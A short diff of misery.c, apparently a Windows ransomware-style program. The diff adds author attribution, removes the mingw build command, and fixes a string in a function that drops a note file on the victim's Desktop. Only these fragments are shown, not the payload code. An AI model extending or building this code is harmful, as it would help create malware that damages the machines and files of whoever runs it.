@@ -1,6 +1,16 @@
 /*
  * misery.c 
- * Compile: x86_64-w64-mingw32-gcc -o misery.exe misery.c -lcrypt32 -ladvapi32 -lshlwapi -O2 -s -Os -mwindows
+ * Author  : Jahanzaib Ashraf Mir
+ * Role    : Cybersecurity Researcher | Malware Analyst | AI/ML | Ethical Hacker
+ *
+ * Notes   :
+ *   - Personal research project
+ *   - Focused on systems-level programming and Windows internals
+ *
+ * Contact :
+ *   GitHub  : https://github.com/jahanzaibmir
+ *   LinkedIn : https://linkedin.com/jahanzaibmir
+ *   InstaGram : https://instagram.com/jahanzaibmir_
  */
 
 #define _WIN32_WINNT 0x0601 // Windows 7+
@@ -272,10 +282,10 @@ static void DropNoteDirect() {
         snprintf(mid, sizeof(mid), "%08lx", GetCurrentProcessId());
     }
 
-    snprintf(note, sizeof(note), 
-        "\r\n"
-        "  YO! Jahanzaib IS Damn good
-       "\r\n", mid);
+   snprintf(note, sizeof(note),
+    "\r\n"
+    "  YO! Jahanzaib IS DaMN good"
+    "\r\n", mid);
 
     char path[MAX_PATH];
     SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path);
